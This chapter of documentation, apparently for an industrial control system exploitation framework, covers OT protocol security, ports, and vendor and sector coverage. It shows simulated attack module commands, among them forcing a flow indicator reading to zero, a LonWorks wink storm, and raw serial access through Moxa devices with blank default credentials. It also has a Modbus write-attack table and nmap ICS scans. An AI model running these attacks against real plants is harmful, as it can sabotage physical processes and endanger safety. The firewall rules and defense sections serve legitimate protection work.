| IEC 61850 GOOSE | Optional (HMAC) | None | Optional | CRITICAL | HIGH |
| OPC UA (None) | None | None | None | CRITICAL | HIGH |
| OPC UA (Sign+Encrypt) | Cert | TLS | TLS | LOW | LOW |
| OPC DA (DCOM) | Windows auth | None | None | HIGH | MEDIUM |
| Omron FINS | None | None | None | CRITICAL | HIGH |
| Unitronics PCOM | None | None | None | CRITICAL | HIGH |
| Beckhoff ADS | None | None | None | CRITICAL | HIGH |
| MQTT (anonymous) | None | None | None | HIGH | HIGH |
| MQTT (TLS+auth) | Username/cert | TLS | TLS | LOW | LOW |
| SNMP v1/v2c | Community string | None | None | HIGH | MEDIUM |
| SNMP v3 (AuthPriv) | HMAC + priv | AES | HMAC | LOW | LOW |
| PROFIBUS DP (via gw) | None | None | None | HIGH | MEDIUM |
| HART-IP | Optional | Optional | Optional | MEDIUM | MEDIUM |
| CANopen | None | None | None | HIGH | MEDIUM |
| CC-Link | None | None | None | HIGH | MEDIUM |
| EtherCAT | None | None | None | HIGH | HIGH |
| KNX/IP | Optional | Optional | Optional | HIGH | HIGH |
| LonWorks | None | None | None | MEDIUM | MEDIUM |
| SECS/GEM (HSMS) | None | None | None | HIGH | MEDIUM |

---

## Protocol Port Reference — Quick Lookup

| Port | Protocol | Transport | Notes |
|------|---------|-----------|-------|
| 102 | Siemens S7comm / S7comm+ / IEC 61850 MMS | TCP | COTP over TCP; also used for MMS |
| 135 | OPC DA/DCOM | TCP | RPC endpoint mapper; dynamic high ports |
| 161 | SNMP | UDP | v1/v2c/v3; OT devices frequently exposed |
| 502 | Modbus TCP | TCP | Most common OT port; always unauthenticated |
| 1883 | MQTT | TCP | IIoT messaging; often anonymous |
| 2404 | IEC 60870-5-104 | TCP | RTU SCADA communications |
| 3671 | KNX/EIBnet | UDP | European building automation |
| 4840 | OPC UA | TCP | Also 4843 (HTTPS variant) |
| 5094 | HART-IP | TCP | HART over Ethernet |
| 5000 | SECS/GEM (HSMS) | TCP | Semiconductor fab equipment |
| 7000 | FL-NET | UDP | Fuji/JTEKT (Japan) |
| 9600 | Omron FINS | UDP/TCP | Omron CS/CJ/NJ PLCs |
| 20000 | DNP3 | TCP/UDP | Power grid RTUs |
| 20111 | Yokogawa Vnet/IP | TCP | CENTUM VP DCS |
| 20256 | Unitronics PCOM | TCP | Vision/Unistream PLCs |
| 44818 | EtherNet/IP (CIP) | TCP | Rockwell, Omron; also 2222/UDP for I/O |
| 47808 | BACnet/IP | UDP | Building automation |
| 48898 | Beckhoff ADS/AMS | TCP | TwinCAT runtime |
| 61450 | CC-Link | UDP | Mitsubishi fieldbus |
| L2 (0x8892) | PROFINET DCP | Ethernet | Broadcast discovery; no IP |
| L2 (0x88A4) | EtherCAT | Ethernet | High-speed motion control |
| L2 (0x88B8) | IEC 61850 GOOSE | Ethernet | Protection relay fast-trip |

---

## Protocol Example 21: PROFIBUS DP

**Description:** PROFIBUS DP (Decentralized Peripherals) is Siemens' master-slave fieldbus for device-level automation. It connects PLCs (masters) to distributed I/O, drives, and instruments (slaves). PROFIBUS DP runs over RS-485 at up to 12 Mbit/s. Access via IXF requires a PROFIBUS-to-Ethernet gateway (Anybus X-Gateway, HMS, or Siemens CP 5622).

**IXF Attack Vector:**

```
ixf > use exploits/protocols/profibus/profibus_read
ixf > set target 192.168.1.1    # gateway IP
ixf > set slave_addr 3          # PROFIBUS slave address
ixf > run

  [SIMULATE MODE — no packets sent]
  Step 1: Connect to gateway TCP on 192.168.1.1
  Step 2: Send PROFIBUS DP diagnostic request to slave 3
  Step 3: Read parameter block (PROFIBUS DP slot 0, index 0)
  Step 4: Enumerate available slaves from GSD configuration
```

---

## Protocol Example 22: FOUNDATION Fieldbus H1

**Description:** FOUNDATION Fieldbus H1 is a digital replacement for 4-20mA analog instrumentation, used in oil & gas, chemical, and pharmaceutical plants. H1 operates at 31.25 kbit/s over twisted pair. Access via IXF requires an FF-to-IP HSE linking device (Emerson DeltaV, National Instruments FieldPoint, or Yokogawa).

**Security Issues:**
- FF H1 has no native authentication or encryption
- Function block parameters (setpoints, alarm limits, cascade outputs) are writable from the HSE backbone
- Subscriber function blocks can be overridden from any HSE host

**IXF Example:**

```
ixf > use exploits/protocols/foundation_fieldbus/ff_block_write
ixf > set target 10.0.0.5    # HSE linking device IP
ixf > set tag "FI-1001/AI1/PV"
ixf > run

  [SIMULATE MODE — no packets sent]
  Step 1: Connect to HSE linking device (TCP 1089)
  Step 2: Send FF HSE SetValue PDU for function block FI-1001 AI1
  Step 3: Write PV value override to 0.0 (process variable forced)
  Step 4: Flow indicator FI-1001 now reads 0 regardless of actual flow
```

---

## Protocol Example 23: LonWorks / LonTalk

**Description:** LonWorks (Local Operating Network) is used in building automation (street lighting, HVAC, metering) and some transportation systems. LonWorks uses the LonTalk protocol over twisted pair, power line, or IP (LonWorks/IP, port 1628 UDP). The LonWorks Wink command causes devices to flash their LED for identification — an adversary can use this to enumerate all devices or to disrupt operations via a rapid wink storm.

**IXF Example:**

```
ixf > use exploits/protocols/lonworks/lon_wink
ixf > set target 192.168.50.1    # LonWorks/IP router
ixf > run

  [SIMULATE MODE — no packets sent]
  Step 1: Send LonWorks/IP UDP datagram to 192.168.50.1:1628
  Step 2: Encode LonTalk Wink command (Network Variable output)
  Step 3: All LonWorks devices on this channel respond/flash
  Step 4: Build device inventory from responses
  [i] More impactful: write Network Variable output to control value
```

---

## Protocol Example 24: SECS/GEM (HSMS)

**Description:** SECS/GEM is mandatory in semiconductor fab equipment communications (SEMI E5/E30/E37). All modern fab tools (CMP, litho, CVD, etch, implant) support HSMS over TCP/5000. S1F1 (Are You There) / S1F2 (On-Line Data) reveals complete equipment identity. S2F41 (Host Command Send) allows triggering equipment state transitions.

**IXF Example:**

```
ixf > use scanners/ics/hsms_scanner
ixf > set target 10.100.1.0/24
ixf > run

  [SIMULATE MODE — no packets sent]
  Step 1: Connect TCP to each host:5000
  Step 2: Send HSMS Select.req (session selection)
  Step 3: Send S1F1 (Are You There)
  Step 4: Parse S1F2 response:
          Equipment Model  : Applied Materials Producer CVD
          Software Version : 3.4.0.2201
          Equipment ID     : TOOL-CVD-01
          Supported Streams: S1, S2, S5, S6, S9, S10
  [i] S2F41 Host Command: initiate recipe download, state change, or alarm acknowledge
  [i] MITRE: T0888, T0855 (Unauthorized Command)
```

---

## Protocol Example 25: Serial-to-Ethernet Converters

**Description:** Moxa NPort, Lantronix UDS, and similar serial-to-Ethernet devices convert RS-232/RS-485 serial OT devices (PLCs, RTUs, meters) to Ethernet-accessible TCP/IP. These are extremely common in legacy OT environments. Many NPort devices have default credentials (`admin` with no password), an unauthenticated web console, and expose raw serial access on TCP/4001.

**IXF Example:**

```
ixf > use scanners/ics/serial_to_ethernet_scanner
ixf > set target 192.168.1.0/24
ixf > run

  [SIMULATE MODE — no packets sent]
  Step 1: Connect to port 4001 (Moxa NPort default serial port 1)
  Step 2: Send Moxa discovery broadcast (UDP 4800)
  Step 3: Parse discovery response:
          Device Name: NPort 5410
          MAC: 00:90:E8:xx:xx:xx
          Firmware: 1.7
          Serial Ports: 4 (all mapped to TCP)
  Step 4: TCP/4001 provides raw serial access to connected RS-232/RS-485 devices
  [i] Connect to port 4001, then send Modbus RTU or DNP3 serial frames directly
  [i] Web console typically on port 80 — test for default admin/(blank)
```

---

## Protocol Coverage by Industry Sector

| Sector | Primary Protocols | Secondary Protocols |
|--------|------------------|-------------------|
| Power generation (thermal, gas, nuclear) | IEC 60870-5-104, IEC 61850, DNP3, Modbus | OPC UA, PROFIBUS, FOUNDATION Fieldbus |
| Power distribution (grid, substations) | IEC 61850 GOOSE/MMS, DNP3, IEC 60870-5-101/104 | Modbus, SEL (proprietary) |
| Oil and gas (upstream) | Modbus RTU, HART, FOUNDATION Fieldbus H1 | OPC DA, OPC UA |
| Oil and gas (downstream refinery) | PROFIBUS, FOUNDATION Fieldbus, Modbus | EtherNet/IP, OPC UA |
| Chemical plants | HART, FOUNDATION Fieldbus, Modbus RTU | PROFIBUS PA, OPC DA |
| Water and wastewater | Modbus TCP, DNP3, IEC 60870-5-104 | BACnet, OPC UA |
| Manufacturing (discrete) | EtherNet/IP (CIP), PROFINET, DeviceNet | Modbus TCP, OPC UA |
| Manufacturing (process) | PROFIBUS, Modbus, HART, CC-Link | OPC UA, EtherNet/IP |
| Automotive | EtherNet/IP, PROFINET, EtherCAT, DeviceNet | PROFIBUS, CANopen |
| Semiconductor fab | SECS/GEM (HSMS), OPC UA | Modbus, Ethernet |
| Building automation | BACnet, KNX, LonWorks, Modbus | OPC UA, MQTT |
| Maritime | NMEA 2000, Modbus TCP, OPC UA | DNP3, HART |
| Railways | IEC 61375, Modbus, OPC UA | CAN, LON |
| Airport (airfield lighting) | DALI, Modbus, BACnet | Ethernet/IP |
| Data center cooling | BACnet, Modbus, LonWorks | OPC UA |

---

## IXF Protocol Roadmap

The following protocols are planned for future IXF versions:

| Protocol | Status | Planned Version |
|---------|--------|----------------|
| WirelessHART (IEC 62591) | Planned | v1.1 |
| ISA-100.11a (IEC 62734) | Planned | v1.1 |
| NMEA 2000 (maritime) | Planned | v1.2 |
| IEC 61375 (railway) | Planned | v1.2 |
| M-Bus (EU smart metering) | Planned | v1.1 |
| DLMS/COSEM (smart meters) | Planned | v1.2 |
| DALI (lighting) | Planned | v1.2 |
| OPC UA PubSub | In progress | v1.1 |
| DDS (real-time robotics) | Research | v1.3 |

To request protocol coverage, open an issue on GitHub: https://github.com/mrhenrike/IndustrialXPL-Forge/issues

---

## Protocol Security Comparison Matrix

Understanding which OT protocols have built-in security controls vs. those that require compensating controls:

| Protocol | Authentication | Encryption | Integrity | Safety Profile | Security Standard |
|----------|---------------|-----------|-----------|---------------|------------------|
| Modbus TCP | None | None | None | None | No security (by design) |
| Modbus RTU | None | None | CRC only | None | No security |
| Siemens S7comm | None (v1/v2/v3) | None | Partial | None | No auth — known issue |
| Siemens S7comm+ | TLS (cert-based) | TLS 1.2+ | TLS HMAC | Partial | CVE-2021-22681 (hardcoded key) |
| EtherNet/IP / CIP | Optional (FactoryTalk) | Optional TLS | Optional | CIP Safety | ODVA security extensions |
| PROFINET DCP | None | None | None | None | Relies on L2 isolation |
| DNP3 | Optional SAv5 | None | HMAC (SAv5) | None | IEEE 1815 Annex D |
| BACnet/IP | None (base) | Optional TLS | None | None | ASHRAE 135-2020 security |
| IEC 60870-5-104 | None | None | None | None | Requires IEC 62351 overlay |
| IEC 61850 MMS | Certificate (62351-3) | TLS | TLS | GooseSec (62351-6) | IEC 62351 series |
| IEC 61850 GOOSE | Optional HMAC (62351-6) | None | HMAC | Yes | IEC 62351-6 |
| OPC UA | Certificate + username | TLS | TLS | Full | OPC UA Security (IEC 62541) |
| OPC DA (DCOM) | Windows NTLM/Kerberos | Optional | NTLM | None | Windows AD security |
| MQTT | Optional username/TLS | Optional TLS | TLS/HMAC | None | MQTT v5 enhanced auth |
| SNMP v1/v2c | Community string | None | None | None | Deprecated — use SNMPv3 |
| SNMP v3 | Username + HMAC | DES/AES | HMAC-MD5/SHA | None | RFC 3410/3412 |
| CANopen | None | None | None | None | Physical layer security only |
| EtherCAT | None | None | None | FSoE (safety) | Physical: L2 isolated |
| HART / HART-IP | None (HART) / TLS (IP) | None / TLS | None / TLS | None | HART-IP TLS optional |

**Key takeaways:**
- Most legacy OT protocols (Modbus, S7comm, DNP3, BACnet) have NO built-in authentication
- Security must be implemented at network layer (firewalls, VLANs, monitoring)
- OPC UA is the most secure OT protocol with full TLS + certificate authentication
- IEC 61850 with IEC 62351 extensions is the substation security standard

---

## Protocol Port Reference for Firewall Rules

Complete port list for ICS firewall policy:

```
# ICS protocol ports — firewall rule reference
# ALLOW (inbound to OT, only from approved sources)
tcp  502        Modbus TCP               # Source: SCADA servers only
tcp  102        S7comm, IEC 61850 MMS   # Source: Engineering WS only
tcp  44818      EtherNet/IP             # Source: SCADA servers only
udp  47808      BACnet/IP               # Source: BAS servers only
tcp  2404       IEC 60870-5-104         # Source: SCADA masters only
tcp  4840       OPC UA                  # Source: OPC UA clients only
udp  9600       Omron FINS              # Source: SCADA servers only
tcp  20256      Unitronics PCOM         # Source: Engineering WS only
tcp  48898      Beckhoff ADS            # Source: Engineering WS only
tcp  20000      DNP3                    # Source: DNP3 masters only
udp  20000      DNP3 UDP                # Source: DNP3 masters only
tcp  1883       MQTT                    # Source: IIoT brokers only (if used)
udp  161        SNMP v3 only            # Source: NMS server only
tcp  5450       OSIsoft PI Server       # Source: Historian clients
tcp  5457,5461  AVEVA Historian         # Source: Historian clients
tcp  4911       Tridium Niagara         # Source: Engineering WS only
tcp  8088       Inductive Automation    # Source: SCADA clients only
tcp  1502       Triconex (SIS)          # Source: SIS engineering only — HIGH RISK if open

# DENY (block all from untrusted sources)
tcp  23         Telnet                  # Block entirely — use SSH only
tcp  21         FTP                     # Block entirely — use SFTP
tcp  80         HTTP (OT mgmt)          # Block from internet; internal only
tcp  135        DCOM (OPC DA)           # Block from untrusted — allow WS only
tcp  3389       RDP                     # Block — use jump server
udp  53         DNS from OT             # Redirect to internal DNS only
tcp  445        SMB                     # Block outbound from OT (NotPetya prevention)
```

---

## Protocol Discovery Automation

### Automated Multi-Protocol Discovery Script

```bash
#!/usr/bin/env bash
# ics-protocol-discovery.sh
# Discovers ICS protocols on a target subnet

TARGET="${1:-192.168.1.0/24}"
echo "=== ICS Protocol Discovery: $TARGET ==="

# Run IXF multi-protocol discovery
ixf \
  use scanners/ics/modbus_detect   set target "$TARGET" check \
  use scanners/ics/s7_comm_scanner  set target "$TARGET" check \
  use scanners/ics/enip_scanner     set target "$TARGET" check \
  use scanners/ics/opcua_scanner    set target "$TARGET" check \
  use scanners/ics/dnp3_scanner     set target "$TARGET" check \
  use scanners/ics/bacnet_scanner   set target "$TARGET" check \
  2>&1 | tee protocol_discovery.txt

# Generate report
ixf report json 2>&1

echo "=== Discovery complete. Results: protocol_discovery.txt ==="
```

### nmap Multi-Protocol ICS Scan

```bash
# Comprehensive ICS protocol scan
nmap -sV -p 102,502,44818,47808,2404,4840,9600,20256,48898,20000,1883,161,1502,4911 \
     --script ics-sweep,ics-enumerate,ics-firmware-version \
     --open \
     192.168.1.0/24

# Output to XML for IXF integration
nmap -sV -p 102,502,44818,47808,2404,4840 \
     --script ics-sweep \
     -oX ics_discovery.xml \
     192.168.1.0/24
```

---

## Vendor-Protocol Matrix

Which vendors use which protocols (common combinations):

| Vendor | Primary Protocol | Secondary | Legacy |
|--------|----------------|-----------|--------|
| Siemens | S7comm+, PROFINET | OPC UA | S7comm |
| Rockwell | EtherNet/IP (CIP) | PCCC, ControlNet | DeviceNet |
| Schneider | Modbus TCP | EtherNet/IP | Uni-Telway |
| ABB | Foundation Fieldbus | OPC UA | Profibus |
| Honeywell | OPC DA/UA | Modbus | Enraf HART |
| Emerson | FOUNDATION FF | OPC UA | Modbus RTU |
| Yokogawa | Vnet/IP, OPC UA | FOUNDATION FF | BRAIN |
| GE/Vernova | OPC UA | Modbus | DNP3 |
| Omron | EtherNet/IP (CIP) | FINS/UDP | DeviceNet |
| Mitsubishi | CC-Link IE | Modbus | CC-Link |
| Beckhoff | EtherCAT, ADS | OPC UA | PROFIBUS |
| WAGO | PROFIBUS, Modbus | OPC UA | Interbus |
| Pilz | PROFIsafe | Modbus | ASi |
| Phoenix Contact | PROFINET | EtherNet/IP | INTERBUS |
| Unitronics | PCOM | Modbus | Serial |
| Tridium | BACnet/IP | Modbus | LonWorks |

---

## Deep-Dive: Modbus Protocol Security

Modbus TCP (port 502) is the most widely exploited ICS protocol because:

1. **No authentication** — any device can send any command
2. **No encryption** — all data in cleartext (ARP/MITM trivial)
3. **No authorization** — read/write are equally accessible to all clients
4. **Broadcast capable** — unit ID 0 reaches all Modbus devices
5. **No session concept** — stateless; no login/logout

### Common Modbus Attacks Covered by IXF

| Function Code | Name | Attack | IXF Module |
|--------------|------|--------|------------|
| FC01 | Read Coils | Status reconnaissance | `exploits/protocols/modbus/modbus_coil_scan` |
| FC02 | Read Discrete Inputs | I/O reconnaissance | `exploits/protocols/modbus/modbus_discrete_scan` |
| FC03 | Read Holding Registers | Setpoint exfiltration | `exploits/protocols/modbus/modbus_register_read` |
| FC04 | Read Input Registers | Sensor value exfiltration | `exploits/protocols/modbus/modbus_input_read` |
| FC05 | Write Single Coil | Output manipulation | `exploits/protocols/modbus/modbus_coil_write` |
| FC06 | Write Single Register | Setpoint manipulation | `exploits/protocols/modbus/modbus_single_register_write` |
| FC15 | Write Multiple Coils | Mass output manipulation | `exploits/protocols/modbus/modbus_multi_coil_write` |
| FC16 | Write Multiple Registers | Mass setpoint attack | `exploits/protocols/modbus/modbus_multi_register_write` |
| FC43 | MEI/Read Device ID | Vendor fingerprinting | `scanners/ics/modbus_detect` |

### Modbus Defense Mechanisms

Since Modbus has no built-in security, compensating controls are required:

- **Network segmentation** — restrict port 502 access to SCADA servers only
- **Modbus firewall** (Modbus-aware DPI) — filter by unit ID, FC, register range
- **Unidirectional gateways** — data diode for historian reads
- **IDS/NDR** (Claroty/Nozomi) — baseline normal Modbus patterns; alert on deviations
- **Encrypted tunnel** (Modbus over TLS/VPN) — for remote access
- **OPC UA migration** — replace Modbus TCP with OPC UA (authentication + encryption)

---

*Previous: [SAST / LLM Analysis](07-sast-llm.md) | Next: [Module Development](09-module-development.md)*
